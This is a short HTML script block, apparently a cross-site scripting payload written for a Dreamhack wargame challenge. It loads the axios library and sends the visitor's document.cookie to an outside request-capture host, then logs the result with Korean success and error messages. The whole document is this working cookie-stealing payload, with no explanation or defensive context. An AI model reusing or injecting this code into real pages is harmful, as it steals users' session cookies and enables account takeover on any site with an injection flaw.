<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
  axios.get('https://lgagroj.request.dreamhack.games/memo?memo='+document.cookie)
    .then(response => {
      console.log('성공:', response);
    })
    .catch(error => {
      console.error('에러:', error);
    });
</script>
